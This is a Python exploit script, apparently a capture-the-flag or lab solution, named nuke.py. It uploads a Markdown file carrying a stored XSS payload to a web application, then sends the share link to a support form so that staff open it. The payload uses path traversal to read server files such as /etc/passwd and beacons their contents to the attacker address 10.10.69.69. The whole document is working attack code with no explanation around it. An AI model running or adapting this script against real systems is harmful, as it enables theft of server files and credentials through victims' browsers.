import requests
import os,sys,re

##
##

# Ensure we have the right number of arguments
if len(sys.argv) != 2:
    print("Usage:\npython3 nuke.py <file_path>")
    print("Example: python3 nuke.py /etc/passwd")
    sys.exit(1)

# Get the file path from the command-line arguments
path = sys.argv[1]

# Craft the XSS payload
xss_payload = f"""
<script>
  fetch("http://things.edu/postal.php?file=../../../..{path}")
    .then(r => r.text())
    .then(t => navigator.sendBeacon("http://10.10.69.69/", t))
</script>
"""

# Send the XSS payload to the vulnerable endpoint
try:
    response = requests.post(
        "http://things.edu/view.php", 
        files={"file": ("test.md", xss_payload, "text/markdown")}
    )
    response.raise_for_status()  # Ensure the request was successful
except requests.exceptions.RequestException as e:
    print(f"Error during POST request to visualizer.php: {e}")
    sys.exit(1)

# Extract the share link from the response
get_links = re.findall(r"http[s]?://\S+", response.text)
if len(get_links) < 3:
    print("Error: Unable to extract the share link from the response.")
    sys.exit(1)

share_link = get_links[2][:-1]  # Remove the trailing character from the URL

# Prepare the data for the next POST request to the receiver
data = {
    "email": "testing@support.edu",
    "message": share_link
}

# Send the extracted share link to the contact.php endpoint
try:
    contact_response = requests.post(
        "http://things.edu/support.php", 
        data=data
    )
    contact_response.raise_for_status()  # Ensure the request was successful
    print(f"Exploit successfully triggered. Share link sent: {share_link}")
except requests.exceptions.RequestException as e:
    print(f"Error during POST request to contact.php: {e}")
    sys.exit(1)

##
##
